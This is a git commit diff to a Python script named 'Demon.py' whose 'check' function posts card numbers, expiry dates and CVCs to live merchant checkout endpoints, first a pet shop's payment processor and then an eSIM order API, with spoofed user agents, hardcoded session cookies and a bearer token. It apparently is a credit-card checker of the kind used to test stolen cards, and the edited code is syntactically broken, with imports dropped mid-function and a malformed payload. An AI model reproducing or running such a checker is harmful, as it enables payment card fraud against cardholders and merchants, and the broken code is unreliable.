ff50f4db5293d0400b756242229f09a5dc5385fd
S99999s <87244655+S99999s@users.noreply.github.com>
2025-06-05 03:04:57 +0300

    Update Demon.py

--- Demon.py
+++ Demon.py
@@ -14,104 +14,39 @@ def check(ccx):
   r = requests.session()
   ua = UserAgent()
   user_agent = ua.random
-  url = "https://www.petswyak.com/shop/payment/transaction/1458"
+import requests
+import json
+
+  url = "https://apiv2.sooesim.com/v1/order/create.php"
 
   payload = {
-      "id": 6,
-      "jsonrpc": "2.0",
-      "method": "call",
-      "params": {
-        "provider_id": 21,
-        "payment_method_id": 209,
-        "token_id": None,
-        "amount": None,
-        "flow": "redirect",
-        "tokenization_requested": False,
-        "landing_route": "/shop/payment/validate",
-        "is_validation": False,
-        "access_token": "4395dba2-b54d-48f6-8909-60f59673e106",
-        "csrf_token": "86d5eaf5868fa17f075d9500a8fbaeac71b9b851o1779449165"
-      }
-    }
+  "package_code": "CKH278",
+  "country_code": "SA",
+  "max_renewals": 1,
+  "quantity": 1,
+  "payment": {
+    "name": "ali mohmed",
+    "email": "gamer@gmail.com",
+    "phone": "5151112230",
+    "cardNumber": n,
+    "expireMonth": mm,
+    "expireYear": yy,
+    "cvc": cvc
+  }
+}
 
   headers = {
-      'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 DuckDuckGo/7 Safari/605.1.15",
-      'Content-Type': "application/json",
-      'sec-fetch-site': "same-origin",
-      'accept-language': "en-US,en;q=0.9",
-      'sec-fetch-mode': "cors",
-      'origin': "https://www.petswyak.com",
-      'referer': "https://www.petswyak.com/shop/payment",
-      'sec-fetch-dest': "empty",
-      'Cookie': "tz=Asia/Beirut; session_id=d90a30584d44794ab2cacbd66aa1f353d49e6681; im_livechat_history=[\"/web/login\",\"/my\",\"/\",\"/shop/cart\",\"/shop/address?partner_id=3395&mode=billing\",\"/shop/address\",\"/shop/address?partner_id=3396&mode=shipping\",\"/shop/extra_info\",\"/shop/payment\"]; _gcl_au=1.1.1732164536.1747756424; website_cookies_bar={\"required\": true,\"optional\": true}; frontend_lang=en_US"
-    }
-
-  response = requests.post(url, data=json.dumps(payload), headers=headers)
-  html = response.json()['result'].get('redirect_form_html', '')
-  id = re.search(r'payment_id=([A-Z0-9]+)', html).group(1) if re.search(r'payment_id=([A-Z0-9]+)', html) else None
-  url = "https://secure.tesspayments.com/Pay/MCPaymentPage"
-
-  params = {
-      'card': "credit",
-      'paymentID': id
-    }
-
-  headers = {
-      'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 DuckDuckGo/7 Safari/605.1.15",
-      'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-      'sec-fetch-site': "same-origin",
-      'sec-fetch-dest': "document",
-      'accept-language': "en-US,en;q=0.9",
-      'sec-fetch-mode': "navigate",
-      'referer': f"https://secure.tesspayments.com/payments/checkout?payment_id={id}"
-    }
-
-  response = requests.get(url, params=params, headers=headers)
-  token = re.search(r'&quot;token&quot;:&quot;([^&]+)&quot;', response.text).group(1)
-  url = "https://checkout.tesspayments.com/processing/purchase/card"
-
-  payload = {
-      "billingAddress": {
-        "phone": "+15572552539",
-        "country": "QA"
-      },
-      "browserInfo": {
-        "colorDepth": 24,
-        "javaEnabled": False,
-        "javaScriptEnabled": True,
-        "language": "en-US",
-        "screenHeight": 896,
-        "screenWidth": 414,
-        "timeZoneOffset": -180,
-        "userAgent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 DuckDuckGo/7 Safari/605.1.15",
-        "platform": "MacIntel"
-      },
-      "card": n,
-      "cvv": cvc,
-      "email": "gamerabdallagfghh@gmail.com",
-      "expiryDate": mm+yy,
-      "inputType": "text",
-      "month": mm,
-      "name": "ALI HA",
-      "panBrandLogo": "brand-logo-visa",
-      "year": yy
-    }
-
-  headers = {
-      'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 DuckDuckGo/7 Safari/605.1.15",
-      'Accept': "application/json, text/plain, */*",
-      'Content-Type': "application/json",
-      'content-type': "application/json;charset=utf-8",
-      'x-requested-with': "XMLHttpRequest",
-      'sec-fetch-site': "same-origin",
-      'accept-language': "en-US,en;q=0.9",
-      'sec-fetch-mode': "cors",
-      'token': token,
-      'origin': "https://checkout.tesspayments.com",
-      'referer': "https://checkout.tesspayments.com/",
-      'sec-fetch-dest': "empty"
-    }
+  'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+  'Content-Type': "application/json",
+  'authorization': "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzb29lc2ltX2FwaSIsInN1YiI6MTIzLCJuYW1lIjoiYWxpIHNocyIsInVzZXJuYW1lIjoiYWxpX3NocyIsImVtYWlsIjoiZ2FtZXJhYmRhbGxhZ0BnbWFpbC5jb20iLCJpYXQiOjE3NDkwNzkyODEsImV4cCI6MTc0OTA4Mjg4MX0.rQF-HoAPzJZ_DavYo2BhlaZdJlxDwEVFQGSkG-98c_E",
+  'sec-fetch-site': "same-site",
+  'accept-language': "en-US,en;q=0.9",
+  'sec-fetch-mode': "cors",
+  'origin': "https://sooesim.com",
+  'referer': "https://sooesim.com/",
+  'sec-fetch-dest': "empty"
+}
 
   r2 = requests.post(url, data=json.dumps(payload), headers=headers)
-  print(r2.text)
+
   return r2.text
